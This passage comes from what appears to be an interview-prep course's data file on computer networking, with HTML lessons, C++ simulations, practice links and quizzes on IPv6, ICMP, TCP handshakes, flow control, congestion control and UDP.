IPv6?</b><br>A: :: replaces one or more consecutive groups of all zeros. Can appear only once per address. Examples: ::1 = loopback, fe80::1 = link-local, 2001:db8::1 = global unicast.</p></div>',
          code: `// === IPv6 and ICMP Concepts Simulation ===
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
using namespace std;

// Validate if a string is a valid simplified IPv6 address
bool isValidIPv6(const string& addr) {
    int colonCount = 0;
    bool hasDoubleColon = false;
    for (size_t i = 0; i < addr.size(); i++) {
        if (addr[i] == ':') {
            colonCount++;
            if (i + 1 < addr.size() && addr[i+1] == ':') {
                if (hasDoubleColon) return false;
                hasDoubleColon = true;
            }
        }
    }
    if (!hasDoubleColon && colonCount != 7) return false;
    if (hasDoubleColon && colonCount > 7) return false;
    return true;
}

// Simulate traceroute
void simulateTraceroute(const string& dest, const vector<string>& hops) {
    cout << "traceroute to " << dest << endl;
    for (int i = 0; i < (int)hops.size(); i++) {
        cout << "  " << (i + 1) << "  " << hops[i];
        if (i == (int)hops.size() - 1)
            cout << "  <-- destination reached" << endl;
        else
            cout << "  (TTL=" << (i+1) << " expired, ICMP Time Exceeded)" << endl;
    }
}

// ICMP message types
void explainICMP() {
    cout << "\\n=== Common ICMP Message Types ===" << endl;
    cout << "Type 0:  Echo Reply (ping response)" << endl;
    cout << "Type 3:  Destination Unreachable" << endl;
    cout << "  Code 0: Network unreachable" << endl;
    cout << "  Code 1: Host unreachable" << endl;
    cout << "  Code 3: Port unreachable (used by traceroute)" << endl;
    cout << "Type 5:  Redirect (better route exists)" << endl;
    cout << "Type 8:  Echo Request (ping)" << endl;
    cout << "Type 11: Time Exceeded (TTL=0, used by traceroute)" << endl;
}

int main() {
    // IPv6 validation
    cout << "=== IPv6 Address Validation ===" << endl;
    vector<string> addrs = {"2001:db8::1", "::1", "fe80::1%eth0", "2001:db8:85a3::8a2e:370:7334"};
    for (auto& a : addrs)
        cout << "  " << a << " -> " << (isValidIPv6(a) ? "valid" : "check format") << endl;

    // IPv4 vs IPv6 comparison
    cout << "\\n=== IPv4 vs IPv6 ===" << endl;
    cout << "IPv4: 32-bit, ~4.3 billion addresses" << endl;
    cout << "IPv6: 128-bit, ~3.4 x 10^38 addresses" << endl;
    cout << "IPv6 removes: header checksum, fragmentation by routers, broadcast" << endl;
    cout << "IPv6 adds: flow labels, mandatory IPsec, SLAAC" << endl;

    // Traceroute simulation
    cout << "\\n=== Traceroute Simulation ===" << endl;
    simulateTraceroute("google.com", {"192.168.1.1", "10.0.0.1", "72.14.233.128", "142.250.80.46"});

    explainICMP();
    return 0;
}`,
          problems: [
            ['IPv6 Concepts', 'https://www.geeksforgeeks.org/internet-protocol-version-6-ipv6/', 'Easy'],
            ['ICMP Protocol', 'https://www.geeksforgeeks.org/internet-control-message-protocol-icmp/', 'Easy'],
            ['Traceroute Explained', 'https://www.geeksforgeeks.org/traceroute-command-in-linux-with-examples/', 'Medium'],
            ['IPv4 vs IPv6 Feature Comparison', 'https://www.geeksforgeeks.org/differences-between-ipv4-and-ipv6/', 'Easy'],
            ['ICMP Message Types & Codes', 'https://www.geeksforgeeks.org/types-of-icmp-internet-control-message-protocol-messages/', 'Medium']
          ],
          mcqs: [
            {q: 'IPv6 addresses are how many bits?', o: ['32', '64', '128', '256'], a: 2},
            {q: 'Which ICMP message type is used by traceroute when TTL expires?', o: ['Echo Reply (type 0)', 'Destination Unreachable (type 3)', 'Redirect (type 5)', 'Time Exceeded (type 11)'], a: 3},
            {q: 'IPv6 eliminates which IPv4 feature?', o: ['TCP support', 'Broadcast', 'Routing', 'Port numbers'], a: 1},
            {q: 'The IPv6 header is fixed at how many bytes?', o: ['20', '32', '40', '60'], a: 2},
            {q: 'Which field in IPv6 replaces TTL?', o: ['Flow Label', 'Next Header', 'Hop Limit', 'Traffic Class'], a: 2},
            {q: 'ICMP Echo Request is Type:', o: ['0', '3', '8', '11'], a: 2},
            {q: 'IPv6 replaces broadcast with:', o: ['Unicast only', 'Multicast and Anycast', 'Tunneling', 'NAT'], a: 1},
            {q: 'SLAAC stands for:', o: ['Secure Link Address Auto-Configuration', 'Stateless Address Auto-Configuration', 'Static Address Assignment Control', 'Subnet-Level Address Allocation Config'], a: 1}
          ],
        },
      ]
    },
    // ==================== TAB 4: Transport Layer (OSI Layer 4) ====================
    {
      id: 'trans', t: 'Transport Layer',
      topics: [
        {
          t: 'TCP 3-Way Handshake & Flow Control',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Every HTTPS request, database query, API call, and SSH session begins with TCP\'s <b>3-way handshake</b> (SYN, SYN-ACK, ACK). Understanding this process explains connection latency, SYN flood attacks, and why TCP Fast Open exists. <b>Flow control</b> via the receiver window prevents buffer overflow — in a trading system processing millions of messages per second, misconfigured TCP buffers can lead to data loss or latency spikes. TCP state transitions (TIME_WAIT, CLOSE_WAIT) are common sources of production bugs.</p></div><div class="learn-section"><div class="learn-h">TCP Overview</div><p class="learn-p"><b>TCP (Transmission Control Protocol)</b> is a <b>connection-oriented, reliable, byte-stream</b> transport protocol defined in <b>RFC 793</b>. It provides: reliable data delivery (no loss, no duplicates, in-order), flow control, congestion control, and full-duplex communication. TCP operates on <b>port numbers</b> (16-bit: 0-65535) to multiplex connections.</p><p class="learn-p">A TCP connection is identified by a <b>4-tuple</b>: (Source IP, Source Port, Destination IP, Destination Port). Well-known ports: HTTP=80, HTTPS=443, SSH=22, FTP=21, DNS=53, SMTP=25.</p></div><div class="learn-section"><div class="learn-h">TCP Segment Structure</div><div class="learn-code">0                   1                   2                   3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|          Source Port          |       Destination Port        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                        Sequence Number                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Acknowledgment Number                      |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Offset|  Res  |C|E|U|A|P|R|S|F|           Window Size         |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|           Checksum            |       Urgent Pointer          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><p class="learn-p">Key fields:</p><ul class="learn-list"><li><b>Sequence Number (32 bits):</b> Byte offset of the first data byte in this segment.</li><li><b>Acknowledgment Number (32 bits):</b> Next byte the receiver expects (cumulative ACK).</li><li><b>Flags:</b> SYN (synchronize), ACK (acknowledgment), FIN (finish), RST (reset), PSH (push), URG (urgent).</li><li><b>Window Size (16 bits):</b> Receiver\'s available buffer space (for flow control). Can be scaled using Window Scale option.</li><li><b>Checksum:</b> Covers header + data + pseudo-header (src IP, dst IP, protocol, length).</li></ul></div><div class="learn-section"><div class="learn-h">TCP 3-Way Handshake (Connection Establishment)</div><p class="learn-p">TCP uses a <b>3-way handshake</b> to establish a reliable connection before data transfer begins. Both sides synchronize their sequence numbers and agree on parameters.</p><div class="learn-code">Client                                Server\n  |                                     |\n  |--- SYN (seq=x) -------------------&gt;|\n  |    (Client chooses ISN = x)         |  State: SYN_SENT\n  |                                     |\n  |&lt;-- SYN+ACK (seq=y, ack=x+1) ------|  State: SYN_RCVD\n  |    (Server chooses ISN = y)         |\n  |                                     |\n  |--- ACK (seq=x+1, ack=y+1) --------&gt;|  State: ESTABLISHED\n  |                                     |  State: ESTABLISHED\n  |=== Data transfer can begin =========|</div><p class="learn-p"><b>Step-by-step:</b></p><ol class="learn-list"><li><b>SYN:</b> Client sends a SYN segment with its <b>Initial Sequence Number (ISN)</b> x. The SYN flag consumes one sequence number.</li><li><b>SYN-ACK:</b> Server responds with SYN+ACK. Its own ISN is y. It acknowledges the client\'s SYN with ack=x+1.</li><li><b>ACK:</b> Client acknowledges the server\'s SYN with ack=y+1. Connection is now <b>ESTABLISHED</b> on both sides.</li></ol><div class="learn-warn"><b>Warning:</b> The ISN is NOT always 0. Modern systems use <b>randomized ISNs</b> to prevent TCP sequence number prediction attacks. The ISN was historically incremented by a fixed amount per connection, but this was exploitable.</div></div><div class="learn-section"><div class="learn-h">TCP Connection Termination (4-Way Handshake)</div><p class="learn-p">TCP uses a <b>4-way handshake</b> to gracefully close a connection. Either side can initiate the close.</p><div class="learn-code">Client                                Server\n  |                                     |\n  |--- FIN (seq=u) -------------------&gt;|  Client: FIN_WAIT_1\n  |                                     |\n  |&lt;-- ACK (ack=u+1) -----------------|  Client: FIN_WAIT_2\n  |                                     |  Server: CLOSE_WAIT\n  |                                     |\n  |&lt;-- FIN (seq=v) -------------------|  Server: LAST_ACK\n  |                                     |\n  |--- ACK (ack=v+1) ----------------&gt;|  Client: TIME_WAIT\n  |                                     |  Server: CLOSED\n  |                                     |\n  | (wait 2*MSL = ~60s)                |\n  | Client: CLOSED                      |</div><p class="learn-p"><b>TIME_WAIT state:</b> The client waits <b>2 * MSL (Maximum Segment Lifetime)</b> before fully closing. This ensures:</p><ul class="learn-list"><li>The final ACK reaches the server (if lost, server retransmits FIN).</li><li>Old duplicate segments from this connection expire and don\'t interfere with new connections on the same port.</li></ul><div class="learn-tip"><b>Tip:</b> The <b>half-close</b> feature of TCP allows one side to stop sending (FIN) but continue receiving. The CLOSE_WAIT state on the server side means the server can still send data after receiving the client\'s FIN.</div></div><div class="learn-section"><div class="learn-h">TCP State Diagram Summary</div><div class="learn-code">CLOSED &rarr; (send SYN) &rarr; SYN_SENT &rarr; (recv SYN+ACK, send ACK) &rarr; ESTABLISHED\nCLOSED &rarr; (recv SYN, send SYN+ACK) &rarr; SYN_RCVD &rarr; (recv ACK) &rarr; ESTABLISHED\n\nESTABLISHED &rarr; (send FIN) &rarr; FIN_WAIT_1 &rarr; (recv ACK) &rarr; FIN_WAIT_2\nFIN_WAIT_2 &rarr; (recv FIN, send ACK) &rarr; TIME_WAIT &rarr; (2*MSL timeout) &rarr; CLOSED\n\nESTABLISHED &rarr; (recv FIN, send ACK) &rarr; CLOSE_WAIT &rarr; (send FIN) &rarr; LAST_ACK\nLAST_ACK &rarr; (recv ACK) &rarr; CLOSED</div></div><div class="learn-section"><div class="learn-h">TCP Flow Control</div><p class="learn-p">TCP uses a <b>sliding window</b> mechanism for flow control. The receiver advertises its available buffer space via the <b>Window Size</b> field (also called <b>rwnd</b> — receiver window). The sender must not send more unacknowledged data than the receiver window allows.</p><div class="learn-code">Sender\'s effective window = min(cwnd, rwnd)\n\nExample:\n  Receiver buffer = 4000 bytes\n  Receiver has 1000 bytes unread\n  rwnd = 4000 - 1000 = 3000 bytes\n\n  Sender can send up to 3000 bytes of unACKed data.</div><p class="learn-p"><b>Zero Window:</b> If the receiver\'s buffer is full, it advertises <b>rwnd = 0</b>. The sender stops sending data but periodically sends <b>Window Probe</b> segments (1 byte) to check if the window has opened. This prevents <b>deadlock</b>.</p><p class="learn-p"><b>Silly Window Syndrome:</b> When the receiver frees only a tiny amount of buffer and advertises a small window, leading to many tiny segments. Solutions:</p><ul class="learn-list"><li><b>Nagle\'s Algorithm (sender-side):</b> Buffer small segments and send when either (a) enough data to fill MSS, or (b) ACK for previous data received.</li><li><b>Clark\'s Solution / Delayed ACK (receiver-side):</b> Don\'t advertise a small window; wait until the buffer has at least MSS or half the buffer free.</li></ul></div><div class="learn-section"><div class="learn-h">TCP Retransmission</div><p class="learn-p">TCP ensures reliability via <b>retransmission</b>. Two mechanisms trigger retransmission:</p><ol class="learn-list"><li><b>Timeout (RTO):</b> If an ACK is not received within the <b>Retransmission Timeout</b>, the segment is retransmitted. RTO is dynamically calculated using SRTT (Smoothed Round-Trip Time) and RTTVAR (RTT Variance).</li><li><b>Fast Retransmit:</b> If the sender receives <b>3 duplicate ACKs</b> for the same sequence number, it retransmits the missing segment immediately without waiting for timeout.</li></ol><div class="learn-code">RTO Calculation (Jacobson\'s Algorithm):\nSRTT = (1 - &alpha;) * SRTT + &alpha; * RTT_sample     (&alpha; = 1/8)\nRTTVAR = (1 - &beta;) * RTTVAR + &beta; * |SRTT - RTT_sample|  (&beta; = 1/4)\nRTO = SRTT + 4 * RTTVAR\n\nOn timeout: RTO is doubled (exponential backoff)</div></div><div class="learn-section"><div class="learn-h">TCP Window Scaling &amp; SACK</div><p class="learn-p"><b>Window Scaling (RFC 7323):</b> The 16-bit Window Size field limits rwnd to 65,535 bytes — far too small for high-bandwidth links. The <b>Window Scale option</b> is negotiated during the 3-way handshake: each side declares a scale factor (0-14). The actual window = Window Size &lt;&lt; scale factor, supporting windows up to <b>~1 GB</b>.</p><div class="learn-code">During handshake:\n  Client SYN:     Window Scale = 7  (window values shifted left 7)\n  Server SYN-ACK: Window Scale = 9\n\nDuring data transfer:\n  Window Size field = 500, Scale = 7\n  Actual rwnd = 500 &lt;&lt; 7 = 64,000 bytes\n\nWithout scaling: max window = 65,535 bytes\n  At 100 Mbps, 50ms RTT: throughput ≤ 65,535 / 0.05 = ~10 Mbps (wastes 90%!)\nWith scaling: window can match bandwidth-delay product</div><p class="learn-p"><b>Selective ACK (SACK, RFC 2018):</b> Standard TCP uses <b>cumulative ACKs</b> — acknowledging up to the first gap. If segments 1,2,4,5 arrive and 3 is lost, the receiver can only ACK up to 2. The sender must guess what else is missing. SACK adds an option that reports exactly which byte ranges have been received, so the sender retransmits <b>only</b> the lost segments.</p><div class="learn-code">Without SACK (cumulative only):\n  Received: [1][2][_][4][5]  → ACK 3 (gap at 3)\n  Sender doesn\'t know 4,5 arrived → may retransmit 3,4,5\n\nWith SACK:\n  Received: [1][2][_][4][5]  → ACK 3, SACK: 4-5\n  Sender knows only 3 is missing → retransmit just segment 3\n\nSACK is negotiated during handshake (SACK Permitted option)\nand reported in subsequent ACKs (up to 3-4 SACK blocks per ACK).</div><div class="learn-tip"><b>Tip:</b> SACK is enabled by default on virtually all modern OS (Linux, Windows, macOS). It dramatically improves performance when multiple segments are lost in one window — a common scenario on wireless and lossy networks.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Walk through the TCP 3-way handshake with sequence numbers.</b><br>A: (1) Client sends SYN with ISN=1000. (2) Server responds SYN+ACK: seq=5000, ack=1001. (3) Client sends ACK: seq=1001, ack=5001. SYN consumes one sequence number, hence ACK = ISN+1. Connection ESTABLISHED.</p><p class="learn-p"><b>Q2: Why does TCP need TIME_WAIT? Why 2*MSL?</b><br>A: Ensures (1) final ACK reaches server (if lost, server retransmits FIN), (2) old duplicate segments expire before port reuse. 2*MSL (typically 60s total) guarantees any segment from this connection is discarded.</p><p class="learn-p"><b>Q3: What happens when rwnd = 0?</b><br>A: Sender stops transmitting but sends periodic <b>Window Probe</b> segments (1-byte) to check if window reopened. Prevents deadlock if receiver\'s window update is lost.</p><p class="learn-p"><b>Q4: What is Silly Window Syndrome?</b><br>A: Receiver advertises tiny windows, causing many small segments with high overhead. Solutions: Nagle\'s Algorithm (buffer small data at sender), Clark\'s Solution (receiver waits until buffer has MSS free), Delayed ACK.</p><p class="learn-p"><b>Q5: How is RTO calculated?</b><br>A: Jacobson\'s algorithm: SRTT = (1-1/8)*SRTT + (1/8)*RTT_sample. RTTVAR = (1-1/4)*RTTVAR + (1/4)*|SRTT - RTT_sample|. RTO = SRTT + 4*RTTVAR. On timeout, RTO doubles (exponential backoff).</p><p class="learn-p"><b>Q6: Difference between FIN_WAIT_2 and CLOSE_WAIT?</b><br>A: FIN_WAIT_2: active closer sent FIN, received ACK, waiting for other side\'s FIN. CLOSE_WAIT: passive closer received FIN, ACKed it, can still send data. CLOSE_WAIT pileup usually means application is not closing sockets.</p></div>',
          code: `// === TCP 3-Way Handshake & Flow Control Simulation in C++ ===
#include <iostream>
#include <string>
#include <queue>
#include <cstdlib>
#include <ctime>
using namespace std;

// TCP Flags
const int SYN = 0x02;
const int ACK = 0x10;
const int FIN = 0x01;
const int RST = 0x04;
const int PSH = 0x08;

struct TCPSegment {
    int srcPort;
    int dstPort;
    uint32_t seqNum;
    uint32_t ackNum;
    int flags;
    int windowSize;
    string data;

    string flagsToString() {
        string s;
        if (flags & SYN) s += "SYN ";
        if (flags & ACK) s += "ACK ";
        if (flags & FIN) s += "FIN ";
        if (flags & RST) s += "RST ";
        if (flags & PSH) s += "PSH ";
        return s;
    }
};

// ---- 3-Way Handshake Simulation ----
void threeWayHandshake() {
    cout << "=== TCP 3-Way Handshake ===" << endl;
    srand(time(0));

    // Client ISN
    uint32_t clientISN = rand() % 100000;
    // Server ISN
    uint32_t serverISN = rand() % 100000;

    // Step 1: Client -> SYN
    TCPSegment syn;
    syn.srcPort = 49152;
    syn.dstPort = 80;
    syn.seqNum = clientISN;
    syn.ackNum = 0;
    syn.flags = SYN;
    syn.windowSize = 65535;
    cout << "Client -> Server: [" << syn.flagsToString()
         << "] seq=" << syn.seqNum << endl;

    // Step 2: Server -> SYN+ACK
    TCPSegment synack;
    synack.srcPort = 80;
    synack.dstPort = 49152;
    synack.seqNum = serverISN;
    synack.ackNum = clientISN + 1;
    synack.flags = SYN | ACK;
    synack.windowSize = 32768;
    cout << "Server -> Client: [" << synack.flagsToString()
         << "] seq=" << synack.seqNum
         << " ack=" << synack.ackNum << endl;

    // Step 3: Client -> ACK
    TCPSegment ack;
    ack.srcPort = 49152;
    ack.dstPort = 80;
    ack.seqNum = clientISN + 1;
    ack.ackNum = serverISN + 1;
    ack.flags = ACK;
    ack.windowSize = 65535;
    cout << "Client -> Server: [" << ack.flagsToString()
         << "] seq=" << ack.seqNum
         << " ack=" << ack.ackNum << endl;

    cout << "Connection ESTABLISHED!" << endl;
}

// ---- Connection Termination ----
void fourWayTermination() {
    cout << "\\n=== TCP 4-Way Termination ===" << endl;
    uint32_t clientSeq = 5000, serverSeq = 8000;

    // Step 1: Client -> FIN
    cout << "Client -> Server: [FIN ACK] seq=" << clientSeq
         << " ack=" << serverSeq << "  (FIN_WAIT_1)" << endl;

    // Step 2: Server -> ACK
    cout << "Server -> Client: [ACK] seq=" << serverSeq
         << " ack=" << (clientSeq + 1) << "  (CLOSE_WAIT)" << endl;

    // Step 3: Server -> FIN
    cout << "Server -> Client: [FIN ACK] seq=" << serverSeq
         << " ack=" << (clientSeq + 1) << "  (LAST_ACK)" << endl;

    // Step 4: Client -> ACK
    cout << "Client -> Server: [ACK] seq=" << (clientSeq + 1)
         << " ack=" << (serverSeq + 1) << "  (TIME_WAIT)" << endl;
    cout << "Waiting 2*MSL (60 seconds)..." << endl;
    cout << "Connection CLOSED." << endl;
}

// ---- Flow Control Simulation ----
void flowControlSimulation() {
    cout << "\\n=== TCP Flow Control ===" << endl;
    const int BUFFER_SIZE = 10; // receiver buffer (simplified)
    int rwnd = BUFFER_SIZE;     // receiver window
    int bytesInFlight = 0;

    // Simulate sending data
    int totalData = 25; // bytes to send
    int sent = 0;
    int acked = 0;

    while (acked < totalData) {
        // Send up to rwnd bytes
        int canSend = min(rwnd - bytesInFlight, totalData - sent);
        if (canSend > 0) {
            cout << "Sender: Send " << canSend << " bytes (seq "
                 << sent << "-" << (sent + canSend - 1) << ")"
                 << " [rwnd=" << rwnd << ", in-flight="
                 << bytesInFlight << "]" << endl;
            sent += canSend;
            bytesInFlight += canSend;
        }

        // Simulate receiver processing
        int processed = min(bytesInFlight, 3); // app reads 3 bytes
        acked += processed;
        bytesInFlight -= processed;
        rwnd = BUFFER_SIZE - bytesInFlight;

        cout << "Receiver: ACK " << acked << ", rwnd=" << rwnd << endl;

        if (rwnd == 0) {
            cout << "** Zero Window! Sender pauses. **" << endl;
            // Window probe
            rwnd = 3; // simulate app reading
            cout << "Window Probe -> rwnd updated to " << rwnd << endl;
        }
    }
    cout << "All " << totalData << " bytes delivered!" << endl;
}

// ---- RTO Calculation ----
void rtoCalculation() {
    cout << "\\n=== RTO Calculation ===" << endl;
    double srtt = 0, rttvar = 0, rto = 1.0;
    double alpha = 0.125, beta = 0.25;

    double samples[] = {100, 120, 80, 90, 150, 85, 110};

    for (int i = 0; i < 7; i++) {
        double rtt = samples[i];
        if (i == 0) {
            srtt = rtt;
            rttvar = rtt / 2.0;
        } else {
            rttvar = (1 - beta) * rttvar + beta * abs(srtt - rtt);
            srtt = (1 - alpha) * srtt + alpha * rtt;
        }
        rto = srtt + 4 * rttvar;
        cout << "RTT sample " << rtt << " ms -> SRTT="
             << (int)srtt << " RTTVAR=" << (int)rttvar
             << " RTO=" << (int)rto << " ms" << endl;
    }
}

int main() {
    threeWayHandshake();
    fourWayTermination();
    flowControlSimulation();
    rtoCalculation();
    return 0;
}`,
          problems: [
            ['TCP 3-Way Handshake Questions', 'https://www.geeksforgeeks.org/tcp-3-way-handshake-process/', 'Easy'],
            ['TCP Connection Termination', 'https://www.geeksforgeeks.org/tcp-connection-termination/', 'Medium'],
            ['TCP Flow Control Problems', 'https://www.geeksforgeeks.org/tcp-tahoe-and-tcp-reno/', 'Medium'],
            ['TCP State Diagram Practice', 'https://www.geeksforgeeks.org/tcp-connection-establishment/', 'Medium'],
            ['TCP Sequence Number Calculations', 'https://www.geeksforgeeks.org/services-and-segment-structure-in-tcp/', 'Medium'],
            ['TIME_WAIT and Socket Exhaustion', 'https://www.geeksforgeeks.org/why-tcp-connect-termination-need-4-way-handshake/', 'Hard']
          ],
          mcqs: [
            {q: 'During the TCP 3-way handshake, what flag combination does the server send in step 2?', o: ['SYN only', 'ACK only', 'SYN + ACK', 'FIN + ACK'], a: 2},
            {q: 'What is the purpose of the TIME_WAIT state?', o: ['Allow the server to send remaining data', 'Ensure the final ACK reaches the server and old segments expire', 'Wait for DNS resolution', 'Buffer incoming connections'], a: 1},
            {q: 'TCP flow control uses which field in the TCP header?', o: ['Urgent Pointer', 'Checksum', 'Window Size', 'Sequence Number'], a: 2},
            {q: 'The SYN flag consumes how many sequence numbers?', o: ['0', '1', '2', 'Depends on data'], a: 1},
            {q: 'The effective sending window in TCP is:', o: ['cwnd only', 'rwnd only', 'min(cwnd, rwnd)', 'max(cwnd, rwnd)'], a: 2},
            {q: 'TCP uses which type of acknowledgment?', o: ['Selective ACK only', 'Cumulative ACK', 'Negative ACK only', 'No acknowledgment'], a: 1},
            {q: 'CLOSE_WAIT pileup on a server indicates:', o: ['Network congestion', 'Client crash', 'Application not closing sockets', 'Firewall blocking'], a: 2},
            {q: 'Nagle\'s algorithm addresses:', o: ['Congestion collapse', 'Silly Window Syndrome', 'SYN flood attacks', 'DNS poisoning'], a: 1}
          ],
        },
        {
          t: 'TCP Congestion Control & UDP',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">In 1986, the Internet experienced its first <b>congestion collapse</b> — throughput dropped to near zero despite full load. TCP congestion control, developed by Van Jacobson, solved this existential threat. Understanding <b>slow start, congestion avoidance, and AIMD</b> explains why downloads ramp up gradually, why Netflix uses TCP BBR, and why UDP is preferred for real-time trading feeds where retransmission is worse than packet loss.</p></div><div class="learn-section"><div class="learn-h">Why Congestion Control?</div><p class="learn-p">While <b>flow control</b> prevents the sender from overwhelming the <b>receiver</b>, <b>congestion control</b> prevents the sender from overwhelming the <b>network</b>. When too many packets are injected into the network, routers\' buffers overflow, causing packet loss, increased delays, and potential <b>congestion collapse</b> (throughput drops to near zero despite high load).</p><p class="learn-p">TCP congestion control is <b>end-to-end</b> — the sender infers congestion from packet loss (timeout or duplicate ACKs) and adjusts its sending rate accordingly using a <b>congestion window (cwnd)</b>.</p><div class="learn-code">Effective sending rate = min(cwnd, rwnd) / RTT\n\ncwnd: sender\'s congestion window (network capacity)\nrwnd: receiver\'s advertised window (receiver capacity)\nThe sender always uses the smaller of the two.</div></div><div class="learn-section"><div class="learn-h">TCP Congestion Control Phases</div><p class="learn-p">TCP uses four main algorithms for congestion control, often collectively called <b>TCP Tahoe/Reno</b>:</p><p class="learn-p"><b>1. Slow Start:</b></p><ul class="learn-list"><li>Initial <code>cwnd = 1 MSS</code> (Maximum Segment Size, typically 1460 bytes).</li><li><code>cwnd</code> <b>doubles every RTT</b> (exponential growth): 1, 2, 4, 8, 16, ...</li><li>Actually: cwnd increases by 1 MSS for every ACK received.</li><li>Continues until <code>cwnd</code> reaches <b>ssthresh</b> (slow start threshold), then switches to Congestion Avoidance.</li></ul><p class="learn-p"><b>2. Congestion Avoidance:</b></p><ul class="learn-list"><li>When <code>cwnd &ge; ssthresh</code>, growth becomes <b>linear</b> (additive increase).</li><li><code>cwnd</code> increases by <b>1 MSS per RTT</b> (not per ACK).</li><li>Implementation: <code>cwnd += MSS * MSS / cwnd</code> for each ACK.</li></ul><p class="learn-p"><b>3. Fast Retransmit:</b></p><ul class="learn-list"><li>When sender receives <b>3 duplicate ACKs</b>, it retransmits the lost segment immediately (without waiting for timeout).</li><li>3 dup ACKs indicate that some segments after the lost one arrived — network is still delivering, so congestion is not catastrophic.</li></ul><p class="learn-p"><b>4. Fast Recovery (TCP Reno only):</b></p><ul class="learn-list"><li>After fast retransmit, set <code>ssthresh = cwnd/2</code> and <code>cwnd = ssthresh</code>, then enter Congestion Avoidance.</li><li><b>RFC 5681 detail:</b> Technically, cwnd is temporarily inflated to <code>ssthresh + 3 MSS</code> (accounting for the 3 segments that triggered dup ACKs), and each further dup ACK adds 1 MSS. When a new ACK arrives, cwnd <b>deflates</b> to ssthresh. For interviews, the simplified version (<code>cwnd = ssthresh</code>) is standard.</li></ul></div><div class="learn-section"><div class="learn-h">TCP Tahoe vs TCP Reno</div><table class="learn-table"><tr><th>Event</th><th>TCP Tahoe</th><th>TCP Reno</th></tr><tr><td>Timeout</td><td>ssthresh = cwnd/2, cwnd = 1, Slow Start</td><td>ssthresh = cwnd/2, cwnd = 1, Slow Start</td></tr><tr><td>3 Duplicate ACKs</td><td>ssthresh = cwnd/2, cwnd = 1, Slow Start</td><td>ssthresh = cwnd/2, cwnd = ssthresh (Fast Recovery)</td></tr></table><div class="learn-code">Example — TCP Reno:\n\nInitial: cwnd = 1, ssthresh = 16\n\nSlow Start (exponential):\nRTT 1: cwnd = 1\nRTT 2: cwnd = 2\nRTT 3: cwnd = 4\nRTT 4: cwnd = 8\nRTT 5: cwnd = 16  (= ssthresh, switch to Congestion Avoidance)\n\nCongestion Avoidance (linear):\nRTT 6: cwnd = 17\nRTT 7: cwnd = 18\n...\nRTT 10: cwnd = 21\n\n** 3 Dup ACKs detected at cwnd = 21 **\nFast Retransmit: retransmit lost segment\nFast Recovery: ssthresh = 21/2 = 10, cwnd = 10\n\nCongestion Avoidance (from cwnd = 10):\nRTT 11: cwnd = 11\nRTT 12: cwnd = 12\n...</div><div class="learn-tip"><b>Tip:</b> The "sawtooth" pattern of TCP throughput comes from the additive increase (linear growth in congestion avoidance) followed by multiplicative decrease (halving cwnd on loss). This is called <b>AIMD — Additive Increase, Multiplicative Decrease</b>.</div></div><div class="learn-section"><div class="learn-h">Modern TCP Variants</div><table class="learn-table"><tr><th>Variant</th><th>Key Feature</th><th>Use Case</th></tr><tr><td>TCP NewReno</td><td>Improved fast recovery (handles multiple losses in one window)</td><td>General purpose</td></tr><tr><td>TCP CUBIC</td><td>Cubic function for cwnd growth (default in Linux)</td><td>High-bandwidth, high-latency</td></tr><tr><td>TCP BBR (Google)</td><td>Model-based, estimates bottleneck bandwidth and RTT</td><td>Google services</td></tr><tr><td>TCP Vegas</td><td>Uses RTT changes (delay-based) instead of loss</td><td>Low-loss environments</td></tr></table></div><div class="learn-section"><div class="learn-h">UDP (User Datagram Protocol)</div><p class="learn-p"><b>UDP</b> is a <b>connectionless, unreliable, message-oriented</b> transport protocol. It provides <b>minimal service</b> — just multiplexing (via ports) and an optional checksum. There is <b>no handshake, no retransmission, no flow control, no congestion control, and no ordering guarantee</b>.</p><div class="learn-code">UDP Header (8 bytes only):\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|          Source Port          |       Destination Port        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|            Length              |           Checksum            |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                         Data (payload)                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><p class="learn-p"><b>Why use UDP?</b></p><ul class="learn-list"><li><b>Low latency:</b> No connection setup delay (no 3-way handshake).</li><li><b>Low overhead:</b> 8-byte header vs 20+ byte TCP header.</li><li><b>No head-of-line blocking:</b> Lost packets don\'t delay others.</li><li><b>Supports broadcast/multicast.</b></li></ul></div><div class="learn-section"><div class="learn-h">TCP vs UDP Comparison</div><table class="learn-table"><tr><th>Feature</th><th>TCP</th><th>UDP</th></tr><tr><td>Connection</td><td>Connection-oriented (3-way handshake)</td><td>Connectionless</td></tr><tr><td>Reliability</td><td>Reliable (ACKs, retransmission)</td><td>Unreliable (best effort)</td></tr><tr><td>Ordering</td><td>In-order delivery</td><td>No ordering guarantee</td></tr><tr><td>Flow Control</td><td>Yes (sliding window)</td><td>No</td></tr><tr><td>Congestion Control</td><td>Yes (AIMD)</td><td>No</td></tr><tr><td>Header Size</td><td>20-60 bytes</td><td>8 bytes</td></tr><tr><td>Speed</td><td>Slower 